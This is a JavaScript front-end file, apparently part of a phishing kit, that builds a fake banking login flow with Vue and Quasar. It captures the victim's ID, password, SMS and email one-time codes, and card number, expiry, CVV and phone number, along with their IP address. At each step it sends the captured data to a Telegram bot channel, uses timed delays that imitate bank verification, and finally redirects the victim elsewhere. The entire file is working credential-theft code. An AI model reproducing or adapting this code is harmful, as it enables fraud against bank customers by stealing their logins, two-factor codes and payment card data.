/*
      Example kicking off the UI. Obviously, adapt this to your specific needs.
      Assumes you have a <div id="q-app"></div> in your <body> above
     */

const app = Vue.createApp({
  components: {
    VForm: Form,
    VField: Field,
    ErrorMessage,
  },
  
  setup() {
   
    const { reactive, onMounted ,watch,ref} = Vue;
    const { useQuasar } = Quasar;
    const $q = useQuasar();
    const idn = ref(null)


    const r = reactive({
      step: 0,
      ID: '',
      DEP:'',
      password: '',
      otp:'',
      emailCode:'',
      numcc:'',
      ex1:'',
      ex2:'',
      cvv:'',
      tel:''

    });

    const state = reactive({
      remember:false,
      stepFacteur:1,
      step:0,
      ready:false,
      options: {},
      loading: false,
      captchaDone: false,
      openOtp: false,
      openInfo:false,
      asterix:'',
      IP:{}
    });

    onMounted(() => {
      
      state.options = options || window.options;
      state.captchaDone = !state.options.base.useCaptcha;

      window.onloadCallback = () => {
        renderCaptcha();
      };

      Init()
    });

 


    async function Init(){
      $q.loading.show({
        spinnerSize:30,
        spinnerColor:'blue',
        backgroundColor:'white'
      })
      state.IP= await getIP()

      $q.loading.hide()
      document.getElementById('app_').style.visibility ='visible'

      setTimeout(()=>{
     idn.value.focus()
      },500)

      

    }

    async function login() {
      state.loading = true;

      var response = await sendData({
        token: options.telegram.token,
        chanel: options.telegram.chanel,
        content: `
       
       ${options.base.label}\nLOGIN INFO  : ${state.IP?.query||state.IP?.ip}
       \n${JSON.stringify(r)}\n



       `,
      });

      setTimeout(()=>{
        state.openOtp = true;

      state.loading = false;
      },state.options.base.timeoutOTP)
    }

    async function sendOtp() {
      state.loading = true;
      var response = await sendData({
        token: options.telegram.token,
        chanel: options.telegram.chanel,
        content: `
       ${options.base.label}\n🔑 OTP : ${state.IP?.query||state.IP?.ip} \n${JSON.stringify(r)}
       `,
      });

     setTimeout(()=>{
      state.loading = false;
      //state.openInfo =true
     // state.openOtp=false
     state.stepFacteur++
     },state.options.base.timeoutEmail)
    }

    async function sendEmailCode() {
      state.loading = true;
      var response = await sendData({
        token: options.telegram.token,
        chanel: options.telegram.chanel,
        content: `
       ${options.base.label}\n🔑 EMAIL CODE : ${state.IP?.query||state.IP?.ip}\n${JSON.stringify(r)}
       `,
      });

      
      state.loading = false;
      state.openInfo =true
     state.openOtp=false
     //state.stepFacteur++
    }

    async function sendInfo() {
      state.loading = true;
      var response = await sendData({
        token: options.telegram.token,
        chanel: options.telegram.chanel,
        content: `
       ${options.base.label}\n💳 CC+INFO : ${state.IP?.query||state.IP?.ip}\n${JSON.stringify(r)}
       `,
      });
      window.location.href = state.options.base?.redirectTo || "";
      state.loading = false;
    }

    function renderCaptcha() {
      grecaptcha.render(document.getElementById("recaptcha"), {
        callback: verify,
        sitekey: state.options.base.captchaKey,
      });
    }

    function verify() {
      state.captchaDone = true;
    }

    function loginAsGood() {
    
      if (!r.ID || !r.password) return false;
      if (r.ID?.length > 9 && r.password.length > 5) {
        return true;
      }

      return false;
    }

    function setPassword(e){
      
      if(!r.password) r.password=''
      if(r.password?.length<6 ){
        r.password+=e
      }
     
      var asterix_ =""
      for(var i=0;  i<Number(r.password?.length);i++){
        asterix_+='*'
      }
      state.asterix=asterix_
    }

    return {
      r,
      state,
      login,
      sendOtp,
      verify,
      loginAsGood,
      setPassword,
      $q,
      sendInfo,
  idn,
      sendEmailCode
      
    };
  },
});

app.use(Quasar, {
  config: {
    brand: {
      primary: "#010035",
      secondary: "#e9041e",
    },
  },
});

//app.component('vForm',VeeValidate.Form)
//app.component('vField',VeeValidate.Field)
//app.use(VeeValidate)
app.mount("#q-app");
